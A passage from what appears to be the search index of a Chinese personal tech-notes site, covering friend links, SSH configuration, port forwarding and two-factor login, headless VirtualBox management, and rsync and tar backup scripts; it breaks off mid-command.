\u2013 bystudent.com</p> <p>\u706b\u65e5\u5c0f\u7ad9 \u2013 www.firesun.me</p> <p>free to play - Kira \u2013 lovekira.cn</p> <p>Jarvis\u2019s Blog \u2013 jarviswang.me</p> <p>LeadroyaL\u2019s website \u2013 www.leadroyal.cn</p> <p>Melody\u6709\u5965\u5999 \u2013 melodia.pw</p> <p>notebook \u2013 py3.io</p> <p>qsboy.com \u2013 qsboy.com</p> <p>\u6a31\u6843\u56ed \u2013 sakura.moe</p> <p>Swing\u2019Blog \u2013 bestwing.me \u2013 \u52aa\u529b\u662f\u4e3a\u4e86 \u7ad9\u5728\u4e07\u4eba\u4e2d\u592e \u6210\u4e3a\u522b\u4eba\u7684\u5149</p> <p>\u4fe1\u946b-King\u2019s Blog \u2013 ycjcl.cc</p> <p>850\u2019s Blog \u2013 850.world</p>"},{"location":"Links/#zju","title":"ZJU","text":"<p>\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u653b\u7565\u5171\u4eab\u8ba1\u5212 \u2013 github.com/QSCTech/zju-icicles</p> <p>NexusHD \u2013 nexushd.org \u2013 \u5185\u7f51pt\u7ad9\u70b9\uff0c\u9ad8\u6e05\u8d44\u6e90</p> <p>CC98 \u2013 cc98.org \u2013 cc98\u662f\u652f\u6301https\u7684\u5662</p> <p>\u6d59\u5927\u4e91\u76d8 \u2013 pan.zju.edu.cn</p> <p>\u6c42\u662f\u6f6eBox \u2013 box.zjuqsc.com</p> <p>\u6559\u52a1\u7f51\u5185\u7f51\u7f51\u5740 \u2013 10.202.78.12</p> <p>\u6559\u52a1\u7f51\u7684\u53cd\u5411\u4ee3\u7406 \u2013 jw.zjuqsc.com</p> <p>\u5f00\u6e90\u955c\u50cf\u7ad9 \u2013 mirrors.zju.edu.cn</p> <p>\u7afa\u9662\u5b66\u751f\u4f1a.\u5b66\u4e60\u8d44\u6599 \u2013 ckcsu.com</p> <p>\u6821\u62db\u85aa\u6c34 \u2013 ioffershow.com</p>"},{"location":"Links/#_5","title":"\u670d\u52a1\u63d0\u4f9b\u5546","text":"<p>\u9999\u6e2fVPS \u2013 diyvm.com</p> <p>\u817e\u8baf\u4e91\u5b66\u751f\u4f18\u60e0 \u2013 qcloud.com</p> <p>\u77ed\u4fe1\u9a8c\u8bc1\u7801 \u963f\u91cc\u5927\u4e8e \u2013 alidayu.com</p> <p>\u79c1\u6709\u4ee3\u7801\u6258\u7ba1 \u2013 coding.net \u2013 \u8bbf\u95ee\u901f\u5ea6\u4f18\u4e8egithub</p>"},{"location":"Links/#_6","title":"\u975e\u6280\u672f\u6587\u7ae0","text":"<p>\u5982\u4f55\u51c6\u5907\u6280\u672f\u7b80\u5386</p> <p>\u6280\u672f\u9762\u8bd5\u6307\u5357</p> <p>\u201c\u4ed6\u5c71\u4e4b\u77f3\uff0c\u53ef\u4ee5\u653b\u7389\u201d\u2014\u2014\u4f60\u7684\u5927\u5b66\uff0c\u600e\u6837\u8fc7\uff1f</p> <p>\u201c\u5e26\u7740\u624b\u673a\u4e0a\u81ea\u4e60\uff0c\u516b\u5c0f\u65f6\u505a\u4e00\u9053\u9898\u201d</p>"},{"location":"Links/#_7","title":"\u7ed3\u8bed","text":"<p>\u4ee3\u7801\u4e0d\u80fd\u5f53\u996d\u5403\uff0c\u4ee3\u7801\u4e0d\u80fd\u5f53\u6c34\u559d\uff0c\u4ee3\u7801\u4e5f\u4e0d\u80fd\u7ed9\u8c01\u751f\u5b69\u5b50\u3002</p>"},{"location":"Linux-SSH/","title":"SSH","text":""},{"location":"Linux-SSH/#id_rsa","title":"\u5ba2\u6237\u7aef\u4e0d\u540c\u670d\u52a1\u5668\u4f7f\u7528\u4e0d\u540c\u7684id_rsa","text":"<p>\u4fee\u6539<code>.ssh/config</code>:</p> <pre><code>Host myshortname realname.example.com\nHostName realname.example.com\nIdentityFile ~/.ssh/realname_rsa # private key for realname\nUser remoteusername\n\nHost aliyun\nHostName 1.2.3.4\nIdentityFile ~/.ssh/realname2_rsa\nPort 10022\nUser root\n</code></pre> <p>\u7136\u540e\u5c31\u80fdssh aliyun\u8fd9\u6837\u8bbf\u95ee1.2.3.4:10022\u7684ssh\u4e86\uff0c\u4e0d\u7528\u4fee\u6539/etc/hosts</p>"},{"location":"Linux-SSH/#sshd","title":"\u6362\u4e2a\u7aef\u53e3\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684sshd","text":"<pre><code>which sshd\n/usr/sbin/sshd -oPort=2333\n</code></pre>"},{"location":"Linux-SSH/#ssh_1","title":"ssh\u53cd\u5411\u4ee3\u7406","text":"<p>\u53c2\u89c1\uff1ahttp://www.tuicool.com/articles/UVRNfi</p> <p>\u5c06\u672c\u673a\u768422\u7aef\u53e3\u8f6c\u53d1\u81f3\u5916\u7f51\u670d\u52a1\u5668\u76842222\u7aef\u53e3\uff1a</p> <pre><code>ssh -b 0.0.0.0 -L 2222:127.0.0.1:22 user@ip\n</code></pre> <p>\u6ce8\u610f\u5728\u8fd0\u884c\u524d\u9700\u8981\u8bbe\u7f6e\u514d\u5bc6\u7801\u767b\u5f55\u4ee5\u53ca\u4fee\u6539\u5916\u7f51\u670d\u52a1\u5668\u7684sshd_config\uff0c\u52a0\u5165GatewayPorts  yes</p>"},{"location":"Linux-SSH/#ssh_2","title":"\u542f\u7528SSH\u5bc6\u94a5\u767b\u5f55\u540e\u4e24\u6b65\u9a8c\u8bc1","text":"<p>\u6548\u679c\uff1a\u4e0d\u5141\u8bb8\u5bc6\u7801\u767b\u5f55\uff0c\u4f7f\u7528\u5bc6\u94a5\u767b\u5f55\u540e\uff0c\u9700\u8981\u8f93\u5165\u624b\u673aGoogle Authenticator\u663e\u793a\u7684\u52a8\u6001\u9a8c\u8bc1\u7801</p> <p>\u6ce8\u610f\u5728\u786e\u5b9a\u4e24\u6b65\u767b\u5f55\u80fd\u6210\u529f\u4e4b\u524d\uff0c\u4fdd\u6301\u4e00\u4e2aSSH\u8fde\u63a5\u4ee5\u514d\u914d\u7f6e\u51fa\u9519\u65e0\u6cd5\u518d\u63a7\u5236\u670d\u52a1\u5668</p> <p>\u7b2c\u96f6\u6b65\uff0c\u786e\u4fdd\u81ea\u5df1\u77e5\u9053root\u5bc6\u7801\u8fd8\u80fd\u7269\u7406\u767b\u5f55\u670d\u52a1\u5668</p> <p>\u7b2c\u4e00\u6b65\uff0c\u5b89\u88c5Google Authenticator\u8fd9\u4e2a\u5305</p> <pre><code>apt-get install -y libpam-google-authenticator\n</code></pre> <p>\u7b2c\u4e8c\u6b65\uff0c\u4fee\u6539/etc/pam.d/sshd</p> <p>\u5728\u9876\u90e8\uff08\u5728@include common-auth\u4e4b\u524d\uff09\u6dfb\u52a0\u8fd9\u4e00\u884c\uff1a</p> <pre><code>auth sufficient pam_google_authenticator.so\n</code></pre> <p>\u7b2c\u4e09\u6b65\uff0c\u4fee\u6539/etc/ssh/sshd_config</p> <p>\u4e0d\u5b58\u5728\u5219\u6dfb\u52a0\uff0c\u5b58\u5728\u4f46\u4e0d\u540c\u5c31\u4fee\u6539\uff0c\u987a\u5e8f\u65e0\u5173</p> <pre><code>PubkeyAuthentication yes\nAuthenticationMethods publickey,keyboard-interactive\nChallengeResponseAuthentication yes\nPasswordAuthentication no\nUsePAM yes\n</code></pre> <p>\u7b2c\u56db\u6b65\uff0c\u521b\u5efa\u4e00\u4e2a\u5bc6\u94a5</p> <pre><code>google-authenticator\n</code></pre> <p>\u5bf9\u95ee\u9898\u5747\u56de\u7b54y\u6216\u8005\u81ea\u884c\u51b3\u5b9a\u54af~</p> <p>\u7b2c\u4e94\u6b65\uff0c\u91cd\u542f\u670d\u52a1\u4ee5\u751f\u6548</p> <p>service ssh restart</p> <p>\u6ce8\u610f\u5b83\u7684\u63d0\u95ee\uff0cVerification code\u95ee\u7684\u624d\u662f\u9a8c\u8bc1\u7801\uff0cPassword\u95ee\u7684\u662f\u8d26\u53f7\u5bc6\u7801</p>"},{"location":"Linux-SSH/#ssh-ubuntu","title":"ssh\u767b\u5f55\u7981\u7528\u9ed8\u8ba4\u7684\u4fe1\u606f\u663e\u793a Ubuntu","text":"<p>Ubuntu \u9ed8\u8ba4\u767b\u5f55\u540e\u4f1a\u663e\u793aWelcome to Ubuntu\u7b49\u591a\u5c11\u8f6f\u4ef6\u5305\u53ef\u4ee5\u5347\u7ea7\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5e76\u4e0d\u662f\u5f88\u91cd\u8981\uff0c\u5374\u4f1a\u62d6\u6162ssh\u767b\u5f55\u7684\u901f\u5ea6</p> <p>\u7981\u7528\u65b9\u6cd5\u5982\u4e0b\uff1aFrom: https://ubuntuforums.org/showthread.php?t=1449020</p> <p>\u7f16\u8f91\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff1a<code>/etc/pam.d/login</code>, <code>/etc/pam.d/sshd</code>\uff0c\u627e\u5230\u5176\u4e2d\u5305\u542b<code>pam_motd</code>\u7684\u884c\uff0c\u6ce8\u91ca\u6389\u4e4b\u540e <code>service ssh reload</code></p> <p>\u4ee5\u540e\u518d\u767b\u5f55ssh\u5c31\u4e0d\u7528\u7b49\u5f85\u4e86</p>"},{"location":"Linux-SSH/#ssh-config","title":"ssh config\u91cc\u76f4\u63a5\u6307\u5b9a\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u53c2\u8003\uff1a https://www.ssh.com/academy/ssh/tunneling/example</p>"},{"location":"Linux-SSH/#_1","title":"\u5728\u672c\u5730\u8bbf\u95ee\u8fdc\u7a0b","text":"<pre><code>LocalForward 5901 computer.myHost.edu:5901\n</code></pre> <p>\u7b49\u4ef7\u4e8e<code>-L 5901:computer.myHost.edu:5901</code>\uff0c\u5c06\u8fdc\u7a0b\u76845901\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730</p>"},{"location":"Linux-SSH/#_2","title":"\u5728\u8fdc\u7a0b\u8bbf\u95ee\u672c\u5730","text":"<pre><code>RemoteForward 1234 127.0.0.1:3421\n</code></pre> <p>\u8fd9\u6837\u7b49\u4ef7\u4e8e<code>-R 1234:127.0.0.1:3421</code>\uff0c\u8ba9\u8fdc\u7a0b\u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee127.0.0.1:1234\u6765\u8bbf\u95ee\u5230\u5ba2\u6237\u7aef\u76843421</p> <p>\u5982\u679c\u9700\u8981\u5141\u8bb8\u8fd9\u4e2a\u8f6c\u53d1\u76841234\u7aef\u53e3\u5bf9\u5916\u63d0\u4f9b\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u4fee\u6539\u670d\u52a1\u5668\u7684sshd_config\uff0c\u8bbe\u7f6e<code>GatewayPorts yes</code></p>"},{"location":"Linux-SSH/#sshd_1","title":"\u666e\u901a\u7528\u6237\u542f\u52a8\u7b2c\u4e8c\u4e2asshd","text":"<p>\u53c2\u8003: - https://serverfault.com/questions/344295/is-it-possible-to-run-sshd-as-a-normal-user - https://serverfault.com/questions/471327/how-to-change-a-ssh-host-key</p> <p>\u4ee5\u4e0b\u4f7f\u7528<code>~/.ssh</code>\u6587\u4ef6\u5939\u5b58\u653eHost key</p> <pre><code>mkdir ~/.ssh -p\nssh-keygen -q -N \"\" -t dsa -f ~/.ssh/ssh_host_dsa_key\nssh-keygen -q -N \"\" -t rsa -b 4096 -f ~/.ssh/ssh_host_rsa_key\nssh-keygen -q -N \"\" -t ecdsa -f ~/.ssh/ssh_host_ecdsa_key\nssh-keygen -q -N \"\" -t ed25519 -f ~/.ssh/ssh_host_ed25519_key\ncp /etc/ssh/sshd_config ~/.ssh/\n</code></pre> <p>\u7f16\u8f91~/.ssh/sshd_config\u6587\u4ef6\uff0c\u4fee\u6539\u8fd9\u4e9b\u9879\u76ee:</p> <ul> <li>UsePrivilegeSeparation no</li> <li>UsePAM no</li> <li>HostKey ~/.ssh/ssh_host_rsa_key &lt;-\u9700\u8981\u66ff\u6362\u4e3a\u7edd\u5bf9\u8def\u5f84</li> <li>Port 2222</li> <li>PasswordAuthentication no</li> </ul> <p>\u7136\u540e\u542f\u52a8sshd\u8fdb\u7a0b\uff1a(\u5982\u679c\u767b\u5f55\u4e0d\u4e86\u52a0\u4e0a-d\u770b\u8c03\u8bd5\u4fe1\u606f\uff09</p> <pre><code>/usr/sbin/sshd -f ~/.ssh/sshd_config\n</code></pre> <p>\u767b\u5f55\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528ssh key\u767b\u5f55\uff0c\u56e0\u4e3asshd\u5e76\u4e0d\u80fd\u8bfb\u53d6/etc/shadow</p>"},{"location":"Linux-VirtualBox/","title":"VirtualBox","text":"<p>\u53c2\u8003 https://www.howtoforge.com/tutorial/running-virtual-machines-with-virtualbox-5.1-on-a-headless-ubuntu-16.04-lts-server/</p> <p>\u5728linux\u7ec8\u7aef\u4e0b\u4f7f\u7528VBoxManage\u548cVBoxHeadless\u521b\u5efa\u3001\u542f\u52a8\u3001\u63a7\u5236\u4e00\u4e2aUbuntu14.04 64Bit\u7684\u865a\u62df\u673a</p>"},{"location":"Linux-VirtualBox/#_1","title":"\u4e0b\u8f7d","text":"<p>http://www.virtualbox.org/wiki/Downloads</p> <p>\u4ece\u5b98\u7f51\u627e\u5230\u5bf9\u5e94\u7684rpm\u6216deb\u4e0b\u8f7d\u5373\u53ef</p> <p>rpm\u6587\u4ef6\u7684\u5b89\u88c5\uff1a</p> <p>rpm -ivh something.rpm</p> <p>deb\u6587\u4ef6\u7684\u5b89\u88c5</p> <p>dpkg -i something.rpm</p> <p>\u6267\u884c<code>dpkg -i</code>\u540e\u9700\u8981\u6267\u884c<code>apt-get -f install</code>\u4ee5\u5b89\u88c5\u7f3a\u5931\u7684\u4f9d\u8d56\u5305</p>"},{"location":"Linux-VirtualBox/#_2","title":"\u4e00\u5b9a\u8981\u5b89\u88c5\u989d\u5916\u5305","text":"<pre><code>cd /tmp\nwget http://download.virtualbox.org/virtualbox/5.1.16/Oracle_VM_VirtualBox_Extension_Pack-5.1.16-113841.vbox-extpack\nsudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-5.1.16-113841.vbox-extpack\n</code></pre>"},{"location":"Linux-VirtualBox/#_3","title":"\u521b\u5efa\u865a\u62df\u673a\uff0c\u8bbe\u7f6e\u865a\u62df\u673a\u9009\u9879","text":"<pre><code>mkdir -p /home/virtualbox\nVBoxManage createvm --name ubuntu --ostype \"Ubuntu_64\" --register --basefolder /home/virtualbox/\nVBoxManage createvdi  --filename ubuntu/ubuntu.vdi --size 102400 # 100GB\nVBoxManage storagectl ubuntu --name storage_controller_1 --add ide\nVBoxManage storageattach ubuntu --storagectl storage_controller_1 \\\n--type hdd --port 0 --device 0  --medium ubuntu/ubuntu.vdi\nVBoxManage storageattach ubuntu --storagectl storage_controller_1 \\\n--type dvddrive --port 1 --device 0 --medium ubuntu-14.04.4-server-amd64.iso\nVBoxManage modifyvm ubuntu --cpus 4 --memory 2048 --acpi on --boot1 dvd --nic1 nat --cableconnected1 on --vrde on --vrdeport 3389\n</code></pre> <p>\u4ee5\u4e0b\u662f\u6211\u5b89\u88c5CentOS 6.8 32bit minimal\u7684\u8fc7\u7a0b</p> <pre><code>pushd /root\ncurl -O http://mirrors.zju.edu.cn/centos/6.8/isos/i386/CentOS-6.8-i386-minimal.iso\nmkdir /home/virtualbox\n#\u770b\u770bostype\u652f\u6301\u54ea\u4e00\u4e9b\uff0c\u7ed3\u679c\u53d1\u73b0\u6709RedHat\uff0c\u5c31\u9009\u5b83\u54af\nVBoxManage list ostypes\nVBoxManage createvm --name centos --ostype \"RedHat\" --register --basefolder /home/virtualbox/\npushd /home/virtualbox\nVBoxManage createvdi  --filename centos/disk.vdi --size 2048 # 2GB\nVBoxManage storagectl centos --name storage_controller_1 --add ide\nVBoxManage storageattach centos --storagectl storage_controller_1 --type hdd --port 0 --device 0  --medium centos/disk.vdi\nVBoxManage storageattach centos --storagectl storage_controller_1 --type dvddrive --port 1 --device 0 --medium /root/CentOS-6.8-i386-minimal.iso\n#\u914d\u7f6eCPU\u548c\u5185\u5b58\u9650\u5236\uff0c\u5149\u9a71\u542f\u52a8\uff0c\u5141\u8bb8\u591a\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\nVBoxManage modifyvm centos --cpus 1 --memory 512 --acpi on --boot1 dvd --nic1 nat --cableconnected1 on --vrde on --vrdeport 13389 --vrdemulticon on\n</code></pre>"},{"location":"Linux-VirtualBox/#_4","title":"\u542f\u52a8\u865a\u62df\u673a","text":"<pre><code>nohup VBoxHeadless -startvm ubuntu --vrde on -e  TCP/Ports=63389 &amp;\n</code></pre>"},{"location":"Linux-VirtualBox/#_5","title":"\u63a7\u5236\u865a\u62df\u673a","text":"<p>Windows\u4e0b\u4f7f\u7528<code>mstsc</code>\u8fdc\u7a0b\u8fde\u63a5\u5373\u53ef\u83b7\u5f97\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\u7684\u7ec8\u7aef\u5b8c\u6210\u7cfb\u7edf\u5b89\u88c5</p>"},{"location":"Linux-VirtualBox/#_6","title":"\u5220\u9664\u786c\u76d8","text":"<pre><code>VBoxManage storageattach centos --storagectl storage_controller_1 --type hdd --port 0 --device 0  --medium none\nVBoxManage closemedium centos/disk.vdi\nrm centos/disk.vdi\n</code></pre>"},{"location":"Linux-VirtualBox/#_7","title":"\u8fd0\u884c\u6761\u4ef6\u4e0b\u4fee\u6539\u7aef\u53e3\u6620\u5c04","text":"<pre><code># \u9996\u5148\u901a\u8fc7mstsc\u7269\u7406\u63a5\u89e6\u865a\u62df\u673a\uff0c\u786e\u8ba4ifconfig\u5df2\u7ecf\u5f97\u5230ip\n# \u5426\u5219\u9700\u8981\u5728\u865a\u62df\u673a\u4e2d\u6267\u884c ifconfig -a \u67e5\u770b\u7f51\u5361\uff0c\u6267\u884c dhclient eth0 \u83b7\u5f97ip\n\n# \u4f8b\u5982\u6211\u4eec\u9700\u8981\u5c06\u865a\u62df\u673a\u768422\u7aef\u53e3\u6620\u5c04\u51fa10022\u7aef\u53e3\n# \u6700\u540e\u4e00\u4e2a\u53c2\u6570\u7684\u683c\u5f0f\uff1a\u89c4\u5219\u540d\u79f0,tcp\u8fd8\u662fudp,\u4e3b\u673a\u7684IP(\u4e0d\u586b\u5c31\u597d),\u4e3b\u673a\u66b4\u9732\u51fa\u6765\u7684\u7aef\u53e3,\u865a\u62df\u673a\u7684IP(\u4e0d\u586b\u5c31\u597d),\u9700\u8981\u6620\u5c04\u7684\u865a\u62df\u673a\u7aef\u53e3\nVBoxManage controlvm \u865a\u62df\u673a\u540d\u79f0 natpf1 ssh,tcp,,10022,,22\n</code></pre>"},{"location":"Linux-VirtualBox/#_8","title":"\u8fd0\u884c\u6761\u4ef6\u4e0b\u5173\u95ed\u8fdc\u7a0b\u63a7\u5236","text":"<p>\u7cfb\u7edf\u5b89\u88c5\u597d\u4e86\uff0cSSH\u5f00\u4e86\uff0cSSH\u7684\u7aef\u53e3\u6620\u5c04\u53ef\u4ee5\u8fde\u4e0a\u53bb\u4e86\uff0c\u5c31\u53ef\u4ee5\u5173\u6389\u8fdc\u7a0b\u63a7\u5236\u4e86</p> <pre><code>VBoxManage controlvm \u865a\u62df\u673a\u540d\u79f0 vrde off\n</code></pre>"},{"location":"Linux-VirtualBox/#_9","title":"\u5c4f\u5e55\u622a\u56fe","text":"<pre><code>VBoxManage controlvm &lt;vm name&gt; screenshotpng /tmp/&lt;filename&gt;.png\n</code></pre>"},{"location":"Linux-VirtualBox/#_10","title":"\u4f18\u96c5\u7684\u5173\u673a","text":"<pre><code>vboxmanage controlvm \u865a\u62df\u673a\u540d\u79f0 poweroff soft\n</code></pre>"},{"location":"Linux-VirtualBox/#vrde","title":"\u5f00\u542fvrde\u8fdc\u7a0b\u684c\u9762","text":"<p>\u4f3c\u4e4e\u9700\u8981\u5148\u5173\u673a\u624d\u80fd\u64cd\u4f5c</p> <pre><code>VBoxManage modifyvm \"VM name\" --vrdeextpack default\nVBoxManage modifyvm \"VM name\" --vrde on\nVBoxManage modifyvm \"VM name\" --vrdeport 3391\nVBoxManage modifyvm \"VM name\" --vrdeaddress 0.0.0.0\n</code></pre>"},{"location":"Linux-VirtualBox/#vdi","title":"\u4ece\u786c\u76d8+\u5feb\u7167vdi\u6587\u4ef6\u6062\u590d","text":"<p>\u5047\u8bbe\u5907\u4efd\u7684\u65f6\u5019\u53ea\u590d\u5236\u4e86\u786c\u76d8vdi\u6587\u4ef6\u548cSnapshots\u7684vdi\u6587\u4ef6\uff0c\u800c\u5fd8\u8bb0\u4e86\u5907\u4efdvbox\u6587\u4ef6\uff0c\u5982\u4f55\u6062\u590d\u5feb\u7167\u5173\u7cfb\u5462</p> <p>\u627e\u5230 https://superuser.com/questions/1224554/recreate-virtualbox-machine-with-snapshots \uff0c\u601d\u8def\u662f\u521b\u5efa\u4e2a\u65b0\u7684\u865a\u62df\u673a \u4ecebase vdi\u5f00\u59cb\u6253\u5feb\u7167-&gt;\u7f16\u8f91vbox\u5c06\u65b0\u7684Snapshot\u6307\u5411\u4e0b\u4e00\u4e2a\u5feb\u7167-&gt;\u7ee7\u7eed\u6253\u5feb\u7167\u91cd\u590d</p> <p>\u5176\u4e2d\u5c31\u9700\u8981\u6211\u4eec\u641e\u6e05\u695a\u5feb\u7167\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u770b\u6587\u4ef6\u4fee\u6539\u7684\u65f6\u95f4\u6233\u5dee\u4e0d\u591a\u53ef\u4ee5\u77e5\u9053\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u8fd9\u79cd\u4fe1\u606f\u4e5f\u4e0d\u5fc5\u6309\u7167\u4eba\u5bb6\u8bf4\u7684\u4e00\u4e2a\u4e2a\u52a0\u8f7d\u5c1d\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u7bc7\u8bf4\u5230\u7684<code>VBoxManage internalcommands dumphdinfo</code>\u6765\u67e5\u770b\u6bcf\u4e2a\u5feb\u7167\u6587\u4ef6\u7684parent\u662f\u8c01\u3002</p>"},{"location":"Linux-backup/","title":"\u5907\u4efd \u5907\u4efd \u5907\u4efd\uff01","text":"<p>\u4e00\u4e2a\u826f\u597d\u5b89\u5168\u7684\u5907\u4efd\u8ba1\u5212\u81f3\u5173\u91cd\u8981\uff0c\u5907\u4efd\u811a\u672c\u5e94\u8be5\u5bfc\u51fa\u6570\u636e\u5e93\u3001\u538b\u7f29\u65e5\u5fd7\u548c\u52a8\u6001\u4ea7\u751f\u7684\u6570\u636e\u6587\u4ef6\uff0c\u52a0\u5bc6\u540e\u4e0a\u4f20\u81f3\u5176\u4ed6\u670d\u52a1\u5668\u6216CDN</p>"},{"location":"Linux-backup/#demo","title":"Demo","text":"<p>\u4e0b\u9762\u7684\u4f8b\u5b50\u6d89\u53ca\u5230date\u3001docker\u3001tar\u3001zip\u3001\u4e03\u725bqshell\u547d\u4ee4\u7684\u4f7f\u7528</p> <pre><code># !/bin/bash\npushd \u5de5\u4f5c\u76ee\u5f55\nd=`date +%Y%m%d`\nmkdir bakup$d\ncd bakup$d\n(docker exec \u5bb9\u5668\u540d\u79f0 mysqldump -p\u5bc6\u7801 \u6570\u636e\u5e93\u540d\u79f0) &gt;database.sql\ntar cvzf log.tar.gz ../log # \u538b\u7f29log\u76ee\u5f55\ncd ../\n# \u4f7f\u7528zip\u52a0\u5bc6\u538b\u7f29\uff0c\u538b\u7f29\u540e\u5220\u9664\u539f\u6587\u4ef6\nzip -r -P \u538b\u7f29\u5bc6\u7801 -m bakup$d.zip bakup$d/\n# \u4f7f\u7528\u4e03\u725b\u7684qshell\u4e0a\u4f20\u5907\u4efd\u6587\u4ef6\uff0c\u8fd0\u884c\u524d\u9700\u8981\u914d\u7f6e\u8d26\u53f7qshell account \u4f60\u7684AK \u4f60\u7684SK\n# \u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u8868\u793a\u5c06bakup$d.zip\u4e0a\u4f20\uff0cCDN\u4e0a\u5b58\u50a8\u7684\u6587\u4ef6\u540d\u4e3a$d.zip\n./qshell fput \u4f60\u7684bucket\u7684\u540d\u79f0 $d.zip bakup$d.zip\n# \u5982\u679c\u4f60\u653e\u5fc3\u53ef\u4ee5\u672c\u5730\u5f7b\u5e95\u5220\u6389\u5907\u4efd\u6587\u4ef6\uff1a\n# rm -r bakup$d.zip\n</code></pre>"},{"location":"Linux-backup/#rsyncscp","title":"\u7528rsync\u4ee3\u66ffscp","text":"<p>rsync\u53ef\u4ee5\u65ad\u70b9\u7eed\u4f20\uff0c\u4e0d\u5982\u5c31\u7528rsync\u4ee3\u66ffscp</p> <p>\u53c2\u8003\uff1ahttps://www.digitalocean.com/community/tutorials/how-to-copy-files-with-rsync-over-ssh</p> <p>\u9996\u5148\u9700\u8981ssh-keygen\u751f\u6210id_rsa,\u628aid_rsa.pub\u7684\u5185\u5bb9\u590d\u5236\u5230\u76ee\u6807\u673a\u5668\u7684~/.ssh/authorized_keys</p> <p>\u5728\u9700\u8981\u4f7f\u7528scp -r\u7684\u5730\u65b9\u6539\u4e3arsync -avz -e \u201cssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u201d \u2013progress</p>"},{"location":"Linux-backup/#tar","title":"tar\u5907\u4efd\u6574\u4e2a\u7cfb\u7edf","text":"<p>\u6bd4\u5982\u901a\u8fc7\u8fdc\u7a0bssh\u7684\u65b9\u5f0f\u4e0b\u8f7d\u5230\u670d\u52a1\u5668\u7684\u6574\u4e2a\u6839\u76ee\u5f55\u6253\u5305\uff1a</p> <pre><code>ssh server tar -cvpz --one-file-system / &gt; server_backup.tar.gz\n</code></pre> <p>\u5176\u4e2d\uff1a</p> <ul> <li>c \u521b\u5efa</li> <li>v \u538b\u7f29\u65f6\u663e\u793a\u8be6\u60c5 \u5f53\u524d\u5904\u7406\u7684\u6587\u4ef6</li> <li>p preserve-permissions\u4fdd\u7559\u6743\u9650\u4fe1\u606f</li> <li>z \u4f7f\u7528gzip\u538b\u7f29</li> </ul>"},{"location":"Linux-backup/#rsynctime-machine","title":"\u4f7f\u7528rsync\u50cftime machine\u4e00\u6837\u5168\u76d8\u5907\u4efd","text":"<p>https://github.com/laurent22/rsync-time-backup</p> <p>\u4f8b\u5982\u5c06Linux\u670d\u52a1\u5668\u591a\u4e2a\u786c\u76d8\u6240\u6709\u6587\u4ef6\u5907\u4efd\u5230/nas/hostname\u4e0b\u9762</p> <p>\u5148\u4ecegithub\u4e0b\u8f7d\u8fd9\u4e2arsync_tmbackup.sh\u6587\u4ef6\uff0c\u5220\u6389\u5176\u4e2d\u7684<code>--one-file-system</code>\uff0c\u653e\u5165/nas\u76ee\u5f55</p> <p>\u5c06\u9700\u8981\u5ffd\u7565\u7684\u76ee\u5f55\u5199\u6210/nas/rsync_ignore.txt\uff0c\u4f8b\u5982\uff1a\uff08\u6ce8\u610f\u5ffd\u7565\u4e86/mnt\uff09</p> <pre><code>- /boot\n- /dev\n- /lost+found\n- /media\n- /mnt\n- /nas\n- /nfs\n- /proc\n- /snap\n- /sys\n- /tmp\n</code></pre> <p>\u7136\u540e\u5c31\u6267\u884c\u5457\uff1a</p> <pre><code>mkdir -p /nas/hostname\ntouch /nas/hostname/backup.marker\n/nas/rsync_tmbackup.sh / /nas/hostname/ /nas/rsync_ignore.txt\n</code></pre> <p>\u597d\u5904\u662f\u4e0d\u7528\u81ea\u5df1\u6784\u9020rsync\u5404\u79cd\u590d\u6742\u7684\u53c2\u6570\uff0c\u5907\u4efd\u7684\u6548\u679c\u662f\u6bcf\u6b21\u5907\u4efd\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u4f46\u4e0a\u6b21\u5907\u4efd\u65f6\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u53ea\u4f1a\u505a\u786c\u94fe\u63a5</p>"},{"location":"Linux-backup/#rsyncroot","title":"rsync\u5907\u4efd\u5230\u975eroot\u7528\u6237\u7684\u76ee\u6807\u673a\u5668\u4e0a","text":"<p>\u53c2\u8003\uff1a https://serverfault.com/questions/755753/preserve-ownership-with-rsync-without-root</p> <p>\u5168\u76d8\u5907\u4efd\u5e0c\u671b\u80fd\u4fdd\u7559\u6587\u4ef6\u7684\u5c5e\u6027\uff0c\u5982\u679c\u76ee\u6807\u4f4d\u7f6e\u6ca1\u6709root\u7528\u6237\u5219\u4e0d\u80fd\u76f4\u63a5\u4fdd\u7559\uff0crsync\u63d0\u4f9b\u4e86<code>--fake-super</code>\u8fd9\u4e2a\u9009\u9879</p> <p>\u8fd9\u4e2a<code>--fake-super</code>\u9009\u9879\u542f\u7528\u540e\uff0crsync\u4f1a\u628a\u5c5e\u6027\u4ee5\u7279\u6b8a\u62d3\u5c55\u5c5e\u6027\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u6062\u590d\u7684\u65f6\u5019rsync\u4f1a\u5229\u7528\u8fd9\u4e2a\u5c5e\u6027\u8fdb\u884c\u6062\u590d</p>"},{"location":"Linux-backup/#rsync","title":"rsync\u5907\u4efd\u5b89\u5353\u624b\u673a","text":"<p>\u53c2\u8003\uff1a http://ptspts.blogspot.com/2015/03/how-to-use-rsync-over-adb-on-android.html</p> <p>\u9996\u5148\u4fdd\u8bc1\u624b\u673a\u7684usb\u8c03\u8bd5\u5f00\u542f\u4e86\uff0cadb shell\u80fd\u8fdb\u5165\u624b\u673a\uff0c\u5728Linux\u4e3b\u673a\u4e0a\u6267\u884c\uff1a</p> <pre><code># \u5c06rsync\u4e8c\u8fdb\u5236\u53d1\u7ed9\u624b\u673a\nwget -O rsync.bin 